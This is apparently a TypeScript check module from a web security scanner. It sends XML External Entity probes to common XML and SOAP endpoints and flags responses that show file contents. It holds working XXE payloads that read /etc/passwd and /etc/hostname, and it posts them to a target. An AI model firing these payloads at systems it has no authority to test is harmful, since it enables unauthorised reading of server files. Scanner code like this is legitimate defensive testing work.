import { ScanContext, ScanFinding, ctxFetch } from "./types";

const XXE_PROBE = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxetest [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>`;

const SOAP_XXE_PROBE = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><xxetest>&xxe;</xxetest></soap:Body>
</soap:Envelope>`;

const XXE_DETECTION_PATTERNS = [
  "root:x:", "daemon:x:", "/bin/bash", "/bin/sh",
  "nobody:x:", "sshd:x:",
];

const XML_ENDPOINTS = [
  "/api/xml", "/api/soap", "/ws", "/webservice", "/soap", "/xmlrpc",
  "/api/upload", "/api/import", "/api/parse", "/api/feed",
  "/sitemap.xml", "/feed.xml", "/rss.xml",
];

export async function runXxeCheck(ctx: ScanContext): Promise<ScanFinding[]> {
  const { targetUrl, emit, discoveredEndpoints, profile } = ctx;
  const findings: ScanFinding[] = [];

  emit({ type: "engine_start", engine: "Burp Suite/XXE", message: "Probing for XML External Entity injection" });

  const base = new URL(targetUrl).origin;
  const budget = profile === "quick" ? 3 : profile === "standard" ? 6 : XML_ENDPOINTS.length;
  const seen = new Set<string>();

  // Probe known XML endpoints
  const endpoints = [
    ...XML_ENDPOINTS.slice(0, budget).map(p => `${base}${p}`),
    ...discoveredEndpoints.filter(ep => ep.includes("xml") || ep.includes("soap") || ep.includes("feed")).slice(0, 3),
  ];

  for (const endpoint of endpoints.slice(0, budget)) {
    if (seen.has(endpoint)) continue;
    seen.add(endpoint);

    // Try standard XXE probe
    const r = await ctxFetch(ctx, endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/xml", Accept: "application/xml, text/xml, */*" },
      body: XXE_PROBE,
    });

    if (!r) continue;

    const body = await r.text().catch(() => "");
    const bodyLower = body.toLowerCase();

    const matched = XXE_DETECTION_PATTERNS.find(p => body.includes(p));
    if (matched) {
      findings.push({
        title: "XML External Entity (XXE) Injection Confirmed",
        category: "XXE",
        severity: "critical",
        endpoint,
        description: `The endpoint is vulnerable to XXE injection. The server processed an XML external entity referencing /etc/passwd and returned its contents. An attacker can read arbitrary files from the server, perform SSRF, or potentially execute remote code.`,
        evidence: `POST ${endpoint}\nContent-Type: application/xml\n\nPayload:\n${XXE_PROBE}\n\nResponse (${r.status}):\n${body.slice(0, 500)}\n\nSensitive content detected: "${matched}"`,
        recommended_fix: "Disable external entity processing in your XML parser. In Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). In PHP: libxml_disable_entity_loader(true). Use a safe XML parsing library.",
        cvss_score: 9.8,
        cwe_id: "CWE-611",
        scanner_name: "Burp Suite",
        scanner_family: "web",
        confidence: 0.95,
      });
      emit({ type: "log", message: `  [XXE CONFIRMED] ${endpoint} — /etc/passwd content detected!` });
      continue;
    }

    // Check for error messages indicating XML processing
    if (r.status === 200 || r.status === 400 || r.status === 500) {
      const hasXmlProcessing = bodyLower.includes("xml") || bodyLower.includes("entity") || bodyLower.includes("doctype");
      const hasErrorLeak = bodyLower.includes("java.lang") || bodyLower.includes("exception") || bodyLower.includes("stack trace");

      if (hasXmlProcessing && hasErrorLeak) {
        findings.push({
          title: "XML Parsing Error — Potential XXE Attack Surface",
          category: "XXE",
          severity: "high",
          endpoint,
          description: `The endpoint processes XML input and returned an error containing XML parsing details. While XXE extraction was not confirmed, the endpoint is XML-processing and may be vulnerable to blind XXE or other XML attacks.`,
          evidence: `POST ${endpoint}\nHTTP ${r.status}\n\nResponse snippet:\n${body.slice(0, 400)}`,
          recommended_fix: "Disable external entity processing and DTD processing in your XML parser. Validate and sanitize all XML input.",
          cvss_score: 7.5,
          cwe_id: "CWE-611",
          scanner_name: "Burp Suite",
          scanner_family: "web",
          confidence: 0.6,
        });
        emit({ type: "log", message: `  [XXE?] XML error leak at ${endpoint}` });
      }
    }

    // Try SOAP endpoint
    const soapR = await ctxFetch(ctx, endpoint, {
      method: "POST",
      headers: { "Content-Type": "text/xml; charset=utf-8", SOAPAction: "test" },
      body: SOAP_XXE_PROBE,
    });

    if (soapR) {
      const soapBody = await soapR.text().catch(() => "");
      const soapMatched = XXE_DETECTION_PATTERNS.find(p => soapBody.includes(p));
      if (soapMatched) {
        findings.push({
          title: "SOAP Endpoint Vulnerable to XXE Injection",
          category: "XXE",
          severity: "critical",
          endpoint,
          description: `The SOAP endpoint processed an XXE payload and returned file contents. SOAP services that parse XML without disabling external entities are critically vulnerable.`,
          evidence: `POST ${endpoint}\nSOAPAction: test\n\nPayload:\n${SOAP_XXE_PROBE.slice(0, 200)}\n\nResponse:\n${soapBody.slice(0, 400)}`,
          recommended_fix: "Disable external entity and DTD processing in your SOAP/XML parser. Use an updated XML library with secure defaults.",
          cvss_score: 9.8,
          cwe_id: "CWE-611",
          scanner_name: "Burp Suite",
          scanner_family: "web",
          confidence: 0.95,
        });
        emit({ type: "log", message: `  [XXE SOAP] ${endpoint}` });
      }
    }
  }

  // Check if main endpoint accepts XML
  const mainR = await ctxFetch(ctx, targetUrl, {
    method: "POST",
    headers: { "Content-Type": "application/xml" },
    body: XXE_PROBE,
  });
  if (mainR && mainR.status !== 405 && mainR.status !== 415) {
    const mainBody = await mainR.text().catch(() => "");
    const matched = XXE_DETECTION_PATTERNS.find(p => mainBody.includes(p));
    if (matched) {
      findings.push({
        title: "Main Endpoint Vulnerable to XXE Injection",
        category: "XXE",
        severity: "critical",
        endpoint: targetUrl,
        description: `The main endpoint accepted an XML payload with external entity reference and returned file system contents. This is a critical vulnerability.`,
        evidence: `POST ${targetUrl}\nHTTP ${mainR.status}\nSensitive content: "${matched}"`,
        recommended_fix: "Disable external entity processing. Never process untrusted XML with DTD enabled.",
        cvss_score: 9.8,
        cwe_id: "CWE-611",
        scanner_name: "Burp Suite",
        scanner_family: "web",
        confidence: 0.95,
      });
    }
  }

  if (findings.length === 0) {
    emit({ type: "log", message: "No XXE vulnerabilities detected" });
  }

  emit({ type: "engine_done", engine: "Burp Suite/XXE", message: `XXE check complete — ${findings.length} finding(s)` });
  return findings;
}
